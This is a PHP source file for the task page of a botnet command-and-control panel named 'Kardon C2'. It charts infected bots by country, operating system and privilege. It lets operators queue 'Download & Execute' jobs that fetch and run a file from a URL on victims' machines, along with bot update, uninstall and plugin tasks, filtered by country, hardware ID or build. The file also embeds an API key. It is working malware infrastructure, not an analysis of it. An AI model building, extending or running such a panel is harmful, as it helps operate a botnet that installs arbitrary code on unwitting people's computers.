<?php
    include '../inc/session.php';
    include '../inc/stats.php';
    include '../inc/geo.php';
    $userperms = $odb->query("SELECT privileges FROM users WHERE username = '".$username."'")->fetchColumn(0);
?>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="A front-end template that helps you build fast, modern mobile web apps.">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <title>Kardon C2</title>
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="icon" sizes="192x192" href="../img/android-desktop.png">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="Material Design Lite">
    <link rel="apple-touch-icon-precomposed" href="../img/ios-desktop.png">
    <meta name="msapplication-TileImage" content="../img/touch/ms-touch-icon-144x144-precomposed.png">
    <meta name="msapplication-TileColor" content="#3372DF">
    <link rel="shortcut icon" href="../img/favicon.png">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en">
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.cyan-light_blue.min.css">
    <link rel="stylesheet" href="../css/styles.css">
    

<!-- bootstrap 3.0.2 -->
<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
        <!-- font Awesome -->
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
        <!-- Ionicons -->
        <link href="css/ionicons.min.css" rel="stylesheet" type="text/css" />
        <!-- Morris chart -->
        <link href="css/morris/morris.css" rel="stylesheet" type="text/css" />
        <!-- jvectormap -->
        <link href="css/jvectormap/jquery-jvectormap-1.2.2.css" rel="stylesheet" type="text/css" />
        <!-- Date Picker -->
        <link href="css/datepicker/datepicker3.css" rel="stylesheet" type="text/css" />
        <!-- fullCalendar -->
        <!-- <link href="css/fullcalendar/fullcalendar.css" rel="stylesheet" type="text/css" /> -->
        <!-- Daterange picker -->
        <link href="css/daterangepicker/daterangepicker-bs3.css" rel="stylesheet" type="text/css" />
        <!-- iCheck for checkboxes and radio inputs -->
        <link href="css/iCheck/all.css" rel="stylesheet" type="text/css" />
        <!-- bootstrap wysihtml5 - text editor -->
        <!-- <link href="css/bootstrap-wysihtml5/bootstrap3-wysihtml5.min.css" rel="stylesheet" type="text/css" /> -->
        <link href='http://fonts.googleapis.com/css?family=Lato' rel='stylesheet' type='text/css'>
        <!-- Theme style -->
        <link href="css/style.css" rel="stylesheet" type="text/css" />


    <style>
    #view-source {
      position: fixed;
      display: block;
      right: 0;
      bottom: 0;
      margin-right: 40px;
      margin-bottom: 40px;
      z-index: 900;
    }
    h6 {
      font-family: "Roboto","Helvetica","Arial",sans-serif;
      font-size: 18px;
      line-height: 1;
      letter-spacing: .02em;
      font-weight: 400;
      box-sizing: border-box;
      color: #757575
    }
    label {
      font-family: "Roboto","Helvetica","Arial",sans-serif;
      font-size: 18px;
      line-height: 1;
      letter-spacing: .02em;
      font-weight: 400;
      box-sizing: border-box;
      color: #757575
    }
    table {
        display: block;
        overflow-x: auto;
        white-space: nowrap;
    }
    </style>
    <script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>
        <script type="text/javascript">
        google.charts.load('current', {
        'packages':['geochart', 'corechart'],
        'mapsApiKey': 'AIzaSyAmjTDuWiy-V8RbMbtk1j6SbBm_hoNftBo'
        });
        google.charts.setOnLoadCallback(drawRegionsMap);
        google.charts.setOnLoadCallback(drawTopCountries);
        google.charts.setOnLoadCallback(drawTopOs);
        google.charts.setOnLoadCallback(drawTopPriv);
        function drawTopPriv()
        {
            var data = google.visualization.arrayToDataTable([
                ['privilege', 'Bots'],
                <?php
                $csel = $odb->query("SELECT privileges, COUNT(*) AS cnt FROM bots GROUP BY privileges ORDER BY cnt DESC");
                while ($c = $csel->fetch())
                {
                    echo '[\'' . $c[0] . '\',';
                    echo $c[1] . '],' . PHP_EOL;
                }
                ?>
              ]);
              var options = {};
              var chart = new google.visualization.PieChart(document.getElementById('piechart3'));
              chart.draw(data, options);
        }
        function drawTopOs()
        {
            var data = google.visualization.arrayToDataTable([
                ['Operating Sys', 'Bots'],
                <?php
                $csel = $odb->query("SELECT osversion, COUNT(*) AS cnt FROM bots GROUP BY osversion ORDER BY cnt DESC LIMIT 3");
                while ($c = $csel->fetch())
                {
                    echo '[\'' . $c[0] . '\',';
                    echo $c[1] . '],' . PHP_EOL;
                }
                ?>
              ]);
              var options = {};
              var chart = new google.visualization.PieChart(document.getElementById('piechart2'));
              chart.draw(data, options);
        }
        function drawTopCountries()
        {
            var data = google.visualization.arrayToDataTable([
                ['Country', 'Bots'],
                <?php
                $csel = $odb->query("SELECT country, COUNT(*) AS cnt FROM bots GROUP BY country ORDER BY cnt DESC LIMIT 3");
                while ($c = $csel->fetch())
                {
                    echo '[\'' . $c[0] . '\',';
                    echo $c[1] . '],' . PHP_EOL;
                }
                ?>
              ]);
              var options = {};
              var chart = new google.visualization.PieChart(document.getElementById('piechart1'));
              chart.draw(data, options);
        }
        function drawRegionsMap() {
            var data = google.visualization.arrayToDataTable([
                ['Country', 'Bots'],
                <?php
                $csel = $odb->query("SELECT country, COUNT(*) AS cnt FROM bots GROUP BY country ORDER BY cnt");
                while ($c = $csel->fetch())
                {
                    echo '[\'' . $c[0] . '\',';
                    echo $c[1] . '],' . PHP_EOL;
                }
                ?>
            ]);
            var options = {};
            var chart = new google.visualization.GeoChart(document.getElementById('regions_div'));
            chart.draw(data, options);
      }
    </script>
  </head>
  <body>
    <div class="demo-layout mdl-layout mdl-js-layout mdl-layout--fixed-drawer mdl-layout--fixed-header">
      <header class="demo-header mdl-layout__header mdl-color--<?php echo $c_header; ?> mdl-color-text--grey-400">
        <div class="mdl-layout__header-row">
          <span class="mdl-layout-title">Tasks</span>
          <div class="mdl-layout-spacer"></div>
          
          <?php echo $header;?>
          
          <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" id="hdrbtn">
            <i class="material-icons">more_vert</i>
          </button>
          <ul class="mdl-menu mdl-js-menu mdl-js-ripple-effect mdl-menu--bottom-right" for="hdrbtn">
            <li onclick="location.href = 'account.php';" class="mdl-menu__item">Account</li>
            <li onclick="location.href = 'settings.php';"class="mdl-menu__item">Settings</li>
            <li onclick="location.href = '../inc/logout.php?logout';"class="mdl-menu__item">Logout</li>
          </ul>
        </div>
      </header>
      <div class="demo-drawer mdl-layout__drawer mdl-color--<?php echo $c_sideBarTop; ?> mdl-color-text--blue-grey-50">
      <header class="demo-drawer-header">
          <img src="../img/user.jpg" class="demo-avatar">
          <div class="demo-avatar-dropdown">
            <span><br /><?php echo $username; ?></span>
            <div class="mdl-layout-spacer"></div>
            <button id="accbtn" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
              <i class="material-icons" role="presentation">arrow_drop_down</i>
              <span class="visuallyhidden">Manage Users</span>
            </button>
            <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="accbtn">
              <li onclick="location.href = 'users.php';" class="mdl-menu__item">Manage Users</li>
            </ul>
          </div>
        </header>
        <nav class="demo-navigation mdl-navigation mdl-color--<?php echo $c_sideBarMain; ?>">
        <a class="mdl-navigation__link" href="index.php">   <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">dashboard</i>Dashboard</a>
        <a class="mdl-navigation__link" href="clients.php"> <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">computer</i>Clients</a>
          <a class="mdl-navigation__link" href="tasks.php">   <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">schedule</i>Tasks</a>
          <?php
          $plugins = array_slice(scandir("./plugin/"), 2);
          foreach ($plugins as &$plugin)
          {
            if(pathinfo($plugin, PATHINFO_EXTENSION) == "php")
            {
              echo '<a class="mdl-navigation__link" href="./plugin/'.$plugin.'">   <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">note</i>'.ucfirst(basename($plugin, ".php")) .'</a>';
            }
          }
          ?>
          <a class="mdl-navigation__link" href="logs.php">    <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">list</i>Logs</a>
        </nav>
      </div>
      <main class="mdl-layout__content mdl-color--<?php echo $c_main; ?>">
        <div class="mdl-grid demo-content">
            <div class="mdl-shadow--2dp mdl-color--<?php echo $c_mainAlt; ?> mdl-cell mdl-cell--12-col">
                <?php
                    if (isset($_GET['act']))
                    {
                        if (!isset($_GET['id']))
                        {
                            echo '<div class="alert alert-danger">No task ID specified. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
                        }else{
                            $act = $_GET['act'];
                            $tid = $_GET['id'];
                            if (ctype_digit($tid))
                            {
                                if (ctype_alnum($act))
                                {
                                    $arr = array('pause', 'resume', 'restart', 'delete');
                                    if (in_array($act, $arr))
                                    {
                                        $cnt = $odb->prepare("SELECT COUNT(*) FROM tasks WHERE id = :i");
                                        $cnt->execute(array(":i" => $tid));
                                        if ($cnt->fetchColumn(0) > 0)
                                        {
                                            $cre = $odb->prepare("SELECT username FROM tasks WHERE id = :i");
                                            $cre->execute(array(":i" => $tid));
                                            $cr = $cre->fetchColumn(0);
                                            $cpermss = $odb->prepare("SELECT privileges FROM users WHERE username = :u");
                                            $cpermss->execute(array(":u" => $cr));
                                            $cperms = $cpermss->fetchColumn(0);
                                            if ($userperms == "moderator" && $cperms == "admin")
                                            {
                                                echo '<div class="alert alert-danger">You cannot manage tasks created by administrators.</div>';
                                            }else{
                                                if ($userperms == "user" && strtolower($cr) != strtolower($username))
                                                {
                                                    echo '<div class="alert alert-danger">You cannot manage tasks created by other users.</div>';
                                                }else{
                                                    switch ($act)
                                                    {
                                                        case "pause":
                                                            $up = $odb->prepare("UPDATE tasks SET status = '2' WHERE id = :i LIMIT 1");
                                                            $up->execute(array(":i" => $tid));
                                                            $in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
                                                            $in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Paused task #'.$tid));
                                                            echo '<div class="alert alert-success">Task has been paused. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
                                                            break;
                                                        case "resume":
                                                            $up = $odb->prepare("UPDATE tasks SET status = '1' WHERE id = :i LIMIT 1");
                                                            $up->execute(array(":i" => $tid));
                                                            $in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
                                                            $in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Resumed task #'.$tid));
                                                            echo '<div class="alert alert-success">Task has been resumed. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
                                                            break;
                                                        case "restart":
                                                            $de = $odb->prepare("DELETE FROM tasks_completed WHERE taskid = :i");
                                                            $de->execute(array(":i" => $tid));
                                                            $in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
                                                            $in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Restarted task #'.$tid));
                                                            echo '<div class="alert alert-success">Task successfully restarted. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
                                                            break;
                                                        case "delete":
                                                            $de = $odb->prepare("DELETE FROM tasks_completed WHERE taskid = :i");
                                                            $de->execute(array(":i" => $tid));
                                                            $da = $odb->prepare("DELETE FROM tasks WHERE id = :i");
                                                            $da->execute(array(":i" => $tid));
                                                            $in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
                                                            $in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Deleted task #'.$tid));
                                                            echo '<div class="alert alert-success">Task successfully deleted. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
                                                            break;
                                                    }
                                                }
                                            }
                                        }else{
                                            echo '<div class="alert alert-danger">Task not found in database. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
                                        }
                                    }else{
                                        echo '<div class="alert alert-danger">Invalid task action. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
                                    }
                                }else{
                                    echo '<div class="alert alert-danger">Task action was not alpha-numeric. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
                                }
                            }else{
                                echo '<div class="alert alert-danger">Task ID was not a digit. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
                            }
                        }
                    }
                    if (isset($_POST['addTask']))
                    {
                        $task = $_POST['task'];
                        $params = $_POST['params'];
                        if ($params == "" || $params == NULL)
                        {
                            $params = "None";
                        }
                        
                        $fbc = 0;
                        $fbi = 0;
                        $fbb = 0;

                        $filter = $_POST['filterOp'];
                        if ($filter == "2") {$fbc = 1; }
                        if ($filter == "3") {$fbi = 1; }
                        if ($filter == "4") {$fbb = 1; }
                        $filters = $_POST['filters'];
                        if ($filters == "" || $filters == NULL)
                        {
                            $filters = "None";
                        }

                        $exs = $_POST['execs'];
                        if ($task)
                        {
                            if (ctype_digit($exs) || $exs == "" || $exs == NULL)
                            {
                                if ($exs == "" || $exs == NULL)
                                {
                                    $exs = "unlimited";
                                }
                                if ($task == "2" || $task == "3")
                                {
                                    if ($userperms != "admin")
                                    {
                                        echo '<div class="alert alert-danger">You do not have permission to use this command.</div>';
                                    }else{
                                        $i = $odb->prepare("INSERT INTO tasks VALUES(NULL, :t, :p, :f, :e, :u, '1', UNIX_TIMESTAMP(), :fbc, :fbi, :fbb)");
                                        $i->execute(array(":t" => $task, ":p" => $params, ":f" => $filters, ":e" => $exs, ":u" => $username, ":fbc" => $fbc, ":fbi" => $fbi, ":fbb" => $fbb));
                                        $i2 = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
                                        $i2->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Created task #'.$odb->query("SELECT id FROM tasks ORDER BY id DESC LIMIT 1")->fetchColumn(0)));
                                        echo '<div class="alert alert-success">Task successfully created. Reloading...</div><meta http-equiv="refresh" content="2">';
                                    }
                                }else{
                                    $i = $odb->prepare("INSERT INTO tasks VALUES(NULL, :t, :p, :f, :e, :u, '1', UNIX_TIMESTAMP(), :fbc, :fbi, :fbb)");
                                        $i->execute(array(":t" => $task, ":p" => $params, ":f" => $filters, ":e" => $exs, ":u" => $username, ":fbc" => $fbc, ":fbi" => $fbi, ":fbb" => $fbb));
                                    $i2 = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
                                    $i2->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Created task #'.$odb->query("SELECT id FROM tasks ORDER BY id DESC LIMIT 1")->fetchColumn(0)));
                                    echo '<div class="alert alert-success">Task successfully created. Reloading...</div><meta http-equiv="refresh" content="2">';
                                }
                            }else{
                                echo '<div class="alert alert-danger">Invalid number of executions.</div>';
                            }
                        }else{
                            echo '<div class="alert alert-danger">Task type was not a digit.</div>';
                        }
                    }
                ?>
                <center><h6>Current Tasks</h6>
                <table id="currenttasks" class="mdl-data-table mdl-js-data-table mdl-data-table mdl-color--<?php echo $c_mainAlt; ?> mdl-shadow--2dp">
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Creator</th>
                            <th>Task</th>
                            <th>Details</th>
                            <th>Executions</th>
                            <th>Filter</th>
                            <th>Date Created</th>
                            <th>Status</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php
                        $tasks = $odb->query("SELECT * FROM tasks");
                        while ($t = $tasks->fetch(PDO::FETCH_ASSOC))
                        {
                            $execs = $odb->prepare("SELECT COUNT(*) FROM tasks_completed WHERE taskid = :i");
                            $execs->execute(array(":i" => $t['id']));
                            $ex = $execs->fetchColumn(0);

                            $failed = $odb->prepare("SELECT COUNT(*) FROM tasks_failed WHERE taskid = :i");
                            $failed->execute(array(":i" => $t['id']));
                            $fd = $failed->fetchColumn(0);

                            $tsk = "";
                            switch ($t['task'])
                            {
                                case "1":
                                    $tsk = "Download & Execute";
                                    break;
                                case "2":
                                    $tsk = "Update";
                                    break;
                                case "3":
                                    $tsk = "Uninstall";
                                    break;
                                case "4":
                                    $tsk = "Reload Plugins";
                            }
                            if($tsk == "")
                            {
                                $tsk = $pluginGuids[$t['task']];
                            }
                            $st = "";
                            if ($t['status'] == "1")
                            {
                                if ($ex == $t['executions'])
                                {
                                    $st = '<small class="badge bg-green">Completed</small>';
                                }else{
                                    $st = '<small class="badge bg-yellow">Running</small>';
                                }
                            }else{
                                $st = '<small class="badge bg-red">Paused</small>';
                            }
                            $actions = "<center>";
                            if ($t['status'] == "1")
                            {
                                $actions .= '<a href="?p=tasks&id='.$t['id'].'&act=pause" title="Pause Task"><i class="fa fa-pause"></i></a>&nbsp;';
                            }else{
                                $actions .= '<a href="?p=tasks&id='.$t['id'].'&act=resume" title="Resume Task"><i class="fa fa-play"></i></a>&nbsp;';
                            }
                            if ($t['executions'] != "unlimited")
                            {
                                if ($ex == $t['executions'])
                                {
                                    $actions .= '<a href="?p=tasks&id='.$t['id'].'&act=restart" title="Restart Task"><i class="fa fa-undo"></i></a>&nbsp;';
                                }
                            }
                            $actions .= '<a href="?p=tasks&id='.$t['id'].'&act=delete" title="Delete Task"><i class="fa fa-times-circle"></i></a></center>';
                            echo '
                            <tr>
                            <td>'.$t['id'].'</td>
                            <td>'.$t['username'].'</td>
                            <td>'.$tsk.'</td>
                            <td><a id="details" data-toggle="tooltip" title="View All Details" href="task.php?id='.$t['id'].'">Show Full Status Info</a></td>
                            <td>'.$ex.'/'.$fd.'/'.$t['executions'].'</td>
                            <td>'.$t['filters'].'</td>
                            <td data-order="'.$t['date'].'">'.date("m-d-Y, h:i A", $t['date']).'</td>
                            <td>'.$st.'</td>
                            <td>'.$actions.'</td>
                            </tr>
                            ';
                        }
                        ?>
                    </tbody>
                </table>
                <br>
            <center>
            </div>
            <div class="mdl-shadow--2dp mdl-color--<?php echo $c_mainAlt; ?> mdl-cell mdl-cell--6-col">
                <center><h6>New Task</h6>
                <br>
                <form action="" method="POST" class="col-lg-12">
                    <label>Task Type</label>
                    <select name="task" class="form-control">
                    <optgroup label="Downloads">
                        <option value="1">Download & Execute</option>
                    </optgroup>
                    <optgroup label="Bot">
                        <option value="2">Update</option>
                        <option value="3">Uninstall</option>
                    </optgroup>
                    <optgroup label="Plugins">
                        <option value="4">Reload Plugins</option>
                        <?php
                        foreach ($pluginGuids as $guid => $name)
                        {
                            echo '<option value="'.$guid.'">'.$name.'</option>';
                        }
                        ?>
                    </optgroup>
                    </select>
                    <br>
                    <label>Parameters</label>
                    <input type="text" class="form-control" name="params" placeholder="Ex: http://site.com/file.exe">
                    <br>
                    <label>Number of Executions</label>
                    <input type="text" class="form-control" name="execs" placeholder="Leave blank for unlimited">
                    <br>

                    <label class="mdl-radio mdl-js-radio mdl-js-ripple-effect" for="option-1">
                    <input type="radio" id="option-1" class="mdl-radio__button" onclick="javascript:filterCheck();" name="filterOp" value="1" checked>
                    <span class="mdl-radio__label">No Filter&nbsp</span>
                    </label>

                    <label class="mdl-radio mdl-js-radio mdl-js-ripple-effect" for="oCountry">
                    <input type="radio" id="oCountry" class="mdl-radio__button" onclick="javascript:filterCheck();" name="filterOp" value="2">
                    <span class="mdl-radio__label">By Country&nbsp</span>
                    </label>

                    <label class="mdl-radio mdl-js-radio mdl-js-ripple-effect" for="oHwid">
                    <input type="radio" id="oHwid" class="mdl-radio__button" onclick="javascript:filterCheck();" name="filterOp" value="3">
                    <span class="mdl-radio__label">By Hwid&nbsp</span>
                    </label>

                    <label class="mdl-radio mdl-js-radio mdl-js-ripple-effect" for="oBuild">
                    <input type="radio" id="oBuild" class="mdl-radio__button" onclick="javascript:filterCheck();" name="filterOp" value="4">
                    <span class="mdl-radio__label">By Build</span>
                    </label>

                    <br><br>
                    <div id="filterD" style="display:none">
                        <label>Filter Paramerters</label>
                        <input type="text" class="form-control" name="filters" placeholder="US, RU, CA, MX" id="filterIn">
                        <br><br>
                    </div>
                    <center><input type="submit" class="btn btn-success" name="addTask" value="Add New Task"></center>
                </form>
                <div class="clearfix"></div>
                </center>   
            </div>
            <div class="mdl-shadow--2dp mdl-color--<?php echo $c_mainAlt; ?> mdl-cell mdl-cell--6-col">
               <center>
                   <br>
                   <ul class="demo-list-three mdl-list">
                    <li class="mdl-list__item mdl-list__item--three-line">
                        <span class="mdl-list__item-primary-content">
                        <i class="material-icons mdl-list__item-avatar">help</i>
                        <span>Downloads</span>
                        <span class="mdl-list__item-text-body">
                            Downloads and Exceutes a file from the internet <br>
                            on a client machine, Files are <i>Opened / Executed</i><br>
                            with the default application
                        </span>
                        </span>
                    </li>
                    <li class="mdl-list__item mdl-list__item--three-line">
                        <span class="mdl-list__item-primary-content">
                        <i class="material-icons  mdl-list__item-avatar">help</i>
                        <span>Bot</span>
                        <span class="mdl-list__item-text-body">
                            Functions that affect the bot or control its behaviour <br>
                            this usually includes updating the bin or uninstaling the bot <br>
                            from the system compleatly
                        </span>
                        </span>
                    </li>
                    </ul>
               </center>
            </div>
        </div>
      </main>
    </div>
    <script src="https://code.getmdl.io/1.3.0/material.min.js"></script>
    <script>
    function filterCheck()
    {
        if(!document.getElementById('option-1').checked) { document.getElementById('filterD').style.display = 'block'; }
        else 
        {
            document.getElementById('filterD').style.display = 'none';
            document.getElementById('filterIn').value = "";
        }
        if(document.getElementById('oCountry').checked) { document.getElementById('filterIn').placeholder = "US, CA, MX"; }
        else if(document.getElementById('oHwid').checked) { document.getElementById('filterIn').placeholder = "XXXX-XXXX-XXXX-XXXX-XXXXX"; }
        else if(document.getElementById('oBuild').checked) { document.getElementById('filterIn').placeholder = "Pinkload-1, Pinkload-2"; }
    }
    </script>
  </body>
</html>
